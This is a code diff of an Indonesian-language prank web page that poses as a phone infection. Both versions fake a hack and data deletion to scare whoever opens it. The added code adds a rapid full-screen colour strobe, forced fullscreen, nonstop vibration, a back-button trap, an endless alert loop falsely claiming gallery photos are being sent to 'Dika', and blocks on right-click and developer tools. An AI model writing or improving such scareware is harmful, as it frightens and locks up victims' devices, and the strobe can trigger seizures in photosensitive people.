@@ -3,105 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sistem Terinfeksi!</title>
+    <title>⚡ SYSTEM OVERLOAD ⚡</title>
     <style>
+        * { cursor: none; }
         body {
             background-color: #000;
-            color: #ff0000;
-            font-family: 'Courier New', monospace;
-            height: 100vh;
             margin: 0;
+            overflow: hidden;
+            font-family: 'Arial Black', Gadget, sans-serif;
+            height: 100vh;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
-            user-select: none;
+            color: white;
+            flex-direction: column;
         }
 
-        .warn-box {
-            border: 5px solid #ff0000;
-            padding: 20px;
-            background: rgba(50, 0, 0, 0.9);
+        #overlay-flash {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 1000;
+            display: none;
+            animation: intense-flash 0.03s infinite;
+        }
+
+        @keyframes intense-flash {
+            0% { background: red; }
+            33% { background: #000; }
+            66% { background: blue; }
+            100% { background: #fff; }
+        }
+
+        .content {
+            position: relative;
+            z-index: 1001;
             text-align: center;
-            animation: blink 0.5s infinite;
+            display: none;
         }
 
-        @keyframes blink {
-            50% { opacity: 0.5; }
+        h1 { font-size: 50px; margin: 0; color: yellow; text-shadow: 5px 5px #ff0000; }
+        .sub-text { font-size: 20px; color: white; background: black; padding: 10px; }
+        
+        #start-screen {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #000;
+            z-index: 2000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #0f0;
+            text-align: center;
+            font-family: monospace;
         }
-
-        #progress-bar {
-            width: 80%;
-            height: 20px;
-            border: 1px solid #ff0000;
-            margin-top: 20px;
-        }
-
-        #fill {
-            height: 100%;
-            background: #ff0000;
-            width: 0%;
-        }
-
-        .status-text { font-size: 12px; margin-top: 10px; color: #fff; }
     </style>
 </head>
-<body onclick="startPanic()">
+<body onclick="launchChaos()">
 
-    <div class="warn-box">
-        <h1>⚠️ PERINGATAN KRITIS ⚠️</h1>
-        <p>SISTEM TELAH DI-HACK OLEH REMOTE_USER_77</p>
-        <div id="progress-bar"><div id="fill"></div></div>
-        <p class="status-text" id="status">MENGHAPUS FOTO DAN KONTAK: 0%</p>
+    <div id="start-screen">
+        <div>
+            <p>> SYSTEM READY...</p>
+            <p style="font-size: 24px; border: 2px solid #0f0; padding: 20px;">[ TAP TO START SCAN ]</p>
+        </div>
     </div>
 
-    <p style="margin-top: 50px; color: #444;">Klik layar untuk membatalkan...</p>
+    <div id="overlay-flash"></div>
 
-    <audio id="alarm" loop>
-        <source src="https://www.soundjay.com/buttons/beep-01a.mp3" type="audio/mpeg">
-    </audio>
+    <div class="content" id="ui">
+        <h1>SUNGKEM KE DIKA!</h1>
+        <div class="sub-text">HARDWARE MALFUNCTION DETECTED</div>
+        <marquee scrollamount="20" style="font-size: 30px; background: yellow; color: black; font-weight: bold; margin-top: 20px;">
+            SUNGKEM KE DIKA SEKARANG! SUNGKEM KE DIKA SEKARANG! 
+        </marquee>
+    </div>
 
     <script>
-        function startPanic() {
-            // 1. Fullscreen otomatis (Bikin bingung cari jalan keluar)
+        function launchChaos() {
+            // 1. FULLSCREEN INSTAN
             let elem = document.documentElement;
-            if (elem.requestFullscreen) { elem.requestFullscreen(); }
-
-            // 2. Mainkan Suara & Getar
-            document.getElementById('alarm').play();
-            if (navigator.vibrate) {
-                navigator.vibrate([200, 100, 200, 100, 500, 100, 800]);
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.webkitRequestFullscreen) { /* Safari */
+                elem.webkitRequestFullscreen();
             }
 
-            // 3. Progres Palsu
-            let width = 0;
-            let fill = document.getElementById('fill');
-            let status = document.getElementById('status');
-            
-            let interval = setInterval(() => {
-                if (width >= 100) {
-                    clearInterval(interval);
-                    status.innerHTML = "DATA BERHASIL TERHAPUS!";
-                    alert("TERIMA KASIH ATAS DATA ANDA.");
-                } else {
-                    width++;
-                    fill.style.width = width + '%';
-                    status.innerHTML = "MENGHAPUS SEMUA DATA: " + width + "%";
-                }
-            }, 100);
+            // 2. Sembunyikan layar awal & aktifkan visual
+            document.getElementById('start-screen').style.display = 'none';
+            document.getElementById('overlay-flash').style.display = 'block';
+            document.getElementById('ui').style.display = 'block';
 
-            // 4. Jebakan Tombol Back
+            // 3. GETARAN LEVEL MAX (Vibrate-Burst)
+            // Menggunakan interval pendek agar getaran bertumpuk dan tidak berhenti
+            if (navigator.vibrate) {
+                setInterval(() => {
+                    // Pola getar tanpa jeda (5 detik getar terus)
+                    navigator.vibrate([5000]); 
+                }, 100); 
+            }
+
+            // 4. KUNCI NAVIGASI BALIK
             history.pushState(null, null, location.href);
             window.onpopstate = function() {
                 history.go(1);
-                alert("SISTEM TERKUNCI! Tombol navigasi dinonaktifkan.");
-                navigator.vibrate(1000);
+                alert("GAK BISA KELUAR! LU HARUS SUNGKEM KE DIKA!");
             };
+
+            // 5. SPAM ALERT & VIBRATE RE-TRIGGER
+            setTimeout(() => {
+                while(true) {
+                    alert("⚠️ WARNING ⚠️\n\nSISTEM ERROR!\nCEPAT SUNGKEM KE DIKA!");
+                    alert("LOG: Data Galeri dikirim ke Dika...");
+                    alert("SUNGKEM ATAU HP LU MELEDAK!");
+                    if (navigator.vibrate) navigator.vibrate(5000);
+                }
+            }, 1000);
         }
 
-        // Mencegah klik kanan
-        document.oncontextmenu = () => false;
+        // Mencegah Inspect Element (opsional)
+        document.onkeydown = function(e) {
+            if(e.keyCode == 123) return false;
+        }
     </script>
 </body>
 </html>
